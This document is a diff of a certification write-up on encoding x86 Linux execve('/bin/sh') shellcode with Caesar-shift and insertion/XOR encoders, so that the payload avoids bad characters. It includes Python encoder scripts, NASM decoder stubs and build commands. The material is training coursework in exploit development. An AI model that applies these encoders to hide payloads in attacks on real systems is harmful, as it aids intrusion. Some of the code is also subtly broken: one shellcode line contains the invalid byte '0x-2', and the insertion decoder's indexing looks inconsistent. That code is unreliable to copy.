@@ -1,14 +1,14 @@
-# Note
+# Note
 
 This MD file has been created for the SecurityTube Linux Assembly Expert certification (https://www.pentesteracademy.com/course?id=3). Student ID: 1483.
 
-# Ceasar encoder
+# Ceasar encoder
 
-Before using *insertion encoder* technique, lets explain a encoder developped in order to :
+Before using *insertion encoder* technique, let's explain an encoder developed in order to :
  * encode shellcode
  * try to avoid bad characters.
  
- Ceasar encryption scheme is used as base. Wikipedia has a very good explaination of this cyper: https://en.wikipedia.org/wiki/Caesar_cipher.
+ Caesar encryption scheme is used as a base. Wikipedia has a very good explanation of this cypher: https://en.wikipedia.org/wiki/Caesar_cipher.
  
 ## Using a 13 left shift
  
@@ -29,13 +29,13 @@ encoded2 = ""
 print('Encoded shellcode ...')
 
 for x in shellcode:
-	# Cesar Encoding 	
-	y = ord(x) - 0xD
-	encoded += '\\x'
-	encoded += '%02x' % y
+ # Cesar Encoding  
+ y = ord(x) - 0xD
+ encoded += '\\x'
+ encoded += '%02x' % y
 
-	encoded2 += '0x'
-	encoded2 += '%02x,' %y
+ encoded2 += '0x'
+ encoded2 += '%02x,' %y
 
 
 print(encoded)
@@ -56,32 +56,32 @@ Len: 25
 Then by simply editing *XOR-Decoder.nasm* example file, a decoder can be written:
   
 ```ASM
-global _start			
+global _start   
 
 section .text
 _start:
-	jmp short call_decoder
+ jmp short call_decoder
 
 decoder:
-	pop esi
-	xor ecx, ecx
-	mov cl, 25
+ pop esi
+ xor ecx, ecx
+ mov cl, 25
 
 decode:
-	add byte [esi], 13
-	inc esi
-	loop decode
-	jmp short Shellcode
+ add byte [esi], 13
+ inc esi
+ loop decode
+ jmp short Shellcode
 
 call_decoder:
-	call decoder
-	Shellcode: db 0x24,0xb3,0x43,0x5b,0x22,0x22,0x66,0x5b,0x5b,0x22,0x55,0x5c,0x61,0x7c,0xd6,0x43,0x7c,0xd5,0x46,0x7c,0xd4,0xa3,0x-2,0xc0,0x73
+ call decoder
+ Shellcode: db 0x24,0xb3,0x43,0x5b,0x22,0x22,0x66,0x5b,0x5b,0x22,0x55,0x5c,0x61,0x7c,0xd6,0x43,0x7c,0xd5,0x46,0x7c,0xd4,0xa3,0x-2,0xc0,0x73
  ```
- ## Cesar encoder/decoder script for avoiding forbiden chars
+ ## Cesar encoder/decoder script for avoiding forbidden chars
  
-Next step will be to try every possible keys in order to find a encoded shellcode without forbiden chars. Script must handle the char use by the ASM decoder. The following Python 3 script took a shellcode and badchars and return, if possible an encoded shellcode with the decoder.
+Next step will be to try every possible key in order to find a encoded shellcode without forbidden chars. Script must handle the char use by the ASM decoder. The following Python 3 script took a shellcode and badchars and return, if possible an encoded shellcode with the decoder.
 
-The script also check if the forbiden chars are present in the decoder stub.
+The script also check if the forbidden chars are present in the decoder stub.
 
 ```python
  #!/usr/bin/python3
@@ -93,22 +93,22 @@ shellcode_decoder = "global _start\n\
 \n\
 section .text\n\
 _start:\n\
-	jmp short call_decoder\n\
+ jmp short call_decoder\n\
 \n\
 decoder:\n\
-	pop esi\n\
-	xor ecx, ecx\n\
-	mov cl, %SIZE%\n\
+ pop esi\n\
+ xor ecx, ecx\n\
+ mov cl, %SIZE%\n\
 \n\
 decode:\n\
-	add byte [esi], %CESAR%\n\
-	inc esi\n\
-	loop decode\n\
-	jmp short Shellcode\n\
+ add byte [esi], %CESAR%\n\
+ inc esi\n\
+ loop decode\n\
+ jmp short Shellcode\n\
 \n\
 call_decoder:\n\
-	call decoder\n\
-	Shellcode: db %ENCODED%"
+ call decoder\n\
+ Shellcode: db %ENCODED%"
 
 badchars = [0x00]
 shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
@@ -119,24 +119,24 @@ for elmt in badchars:
       print("One or more badchars is present in the decoder stub")
       sys.exit(1)
 """
- 8048080:	eb 0d                	jmp    804808f <call_decoder>
+ 8048080: eb 0d                 jmp    804808f <call_decoder>
 
 08048082 <decoder>:
- 8048082:	5e                   	pop    esi
- 8048083:	31 c9                	xor    ecx,ecx
- 8048085:	b1 19                	mov    cl,0x19
+ 8048082: 5e                    pop    esi
+ 8048083: 31 c9                 xor    ecx,ecx
+ 8048085: b1 19                 mov    cl,0x19
 
 08048087 <decode>:
- 8048087:	80 06 0d             	add    BYTE PTR [esi],0xd
- 804808a:	46                   	inc    esi
- 804808b:	e2 fa                	loop   8048087 <decode>
- 804808d:	eb 05                	jmp    8048094 <Shellcode>
+ 8048087: 80 06 0d              add    BYTE PTR [esi],0xd
+ 804808a: 46                    inc    esi
+ 804808b: e2 fa                 loop   8048087 <decode>
+ 804808d: eb 05                 jmp    8048094 <Shellcode>
 
 0804808f <call_decoder>:
- 804808f:	e8 ee ff ff ff 
+ 804808f: e8 ee ff ff ff 
 
-   0:	fe 06                	inc    BYTE PTR [esi]
-   2:	fe 0e                	dec    BYTE PTR [esi]
+   0: fe 06                 inc    BYTE PTR [esi]
+   2: fe 0e                 dec    BYTE PTR [esi]
 """
 
 for i in range(1, 0xFF):
@@ -145,7 +145,7 @@ for i in range(1, 0xFF):
    encoded = ""
    encoded2 = ""
    for x in shellcode :
-      # Cesar Encoding 	
+      # Cesar Encoding  
       y = ord(x) - i
       if y in badchars:
          break
@@ -174,7 +174,7 @@ print(shellcode_decoder)
 
 # Insertion decoder
 
-No lets try an insertion encoder. The idea will be to:
+Now let's try an insertion encoder. The idea will be to:
 
 - Take two bytes of the shellcode
 - Reverse the order
@@ -238,39 +238,39 @@ global _start
 
 section .text
 _start:
-	jmp short call_shellcode
+ jmp short call_shellcode
 
 decoder:
-	pop esi
-	xor eax, eax ;al for first byte
-	cdq ;dl for XOR
-	xor ebx, ebx ; bl for third byte
-	xor ecx, ecx ; as a counter
+ pop esi
+ xor eax, eax ;al for first byte
+ cdq ;dl for XOR
+ xor ebx, ebx ; bl for third byte
+ xor ecx, ecx ; as a counter
 
 
 decode:
-	mov al, [esi+ecx]
-	mov bl, [esi+ecx+1]
-	mov dl, [esi+ecx+2]
-	xor al, dl
-	xor bl, dl
-	mov byte [esi], bl
-	mov byte [esi+1], al
-	add esi, 2
-	inc ecx
-	cmp ecx, 13
-	jz short EncodedShellcode
-	jmp decode
+ mov al, [esi+ecx]
+ mov bl, [esi+ecx+1]
+ mov dl, [esi+ecx+2]
+ xor al, dl
+ xor bl, dl
+ mov byte [esi], bl
+ mov byte [esi+1], al
+ add esi, 2
+ inc ecx
+ cmp ecx, 13
+ jz short EncodedShellcode
+ jmp decode
 
 call_shellcode:
 
-	call decoder
-	EncodedShellcode: db 0x25,0xd4,0xe5,0xee,0xd6,0x86,0x0c,0x0c,0x23,0x92,0x89,0xfa,0x92,0xd5,0xbd,0x2d,0x26,0x44,0x35,0xd2,0xbc,0xff,0x4c,0xaf,0xf6,0x9d,0x14,0x5e,0x84,0xd7,0xc8,0x99,0x78,0x55,0x93,0x98,0x67,0x77,0xf7
+ call decoder
+ EncodedShellcode: db 0x25,0xd4,0xe5,0xee,0xd6,0x86,0x0c,0x0c,0x23,0x92,0x89,0xfa,0x92,0xd5,0xbd,0x2d,0x26,0x44,0x35,0xd2,0xbc,0xff,0x4c,0xaf,0xf6,0x9d,0x14,0x5e,0x84,0xd7,0xc8,0x99,0x78,0x55,0x93,0x98,0x67,0x77,0xf7
 ```
 
 ## Execution
 
-Note: the *-N* option should not be forgottent in order to be able to write in the text segment.
+Note: the *-N* option should not be forgotten in order to be able to write in the text segment.
 
 ```
 cervoise@slae:~/exam/encoder$  nasm -f elf32 insertion-decoder.nasm &&  ld -N -o insertion-decoder insertion-decoder.o
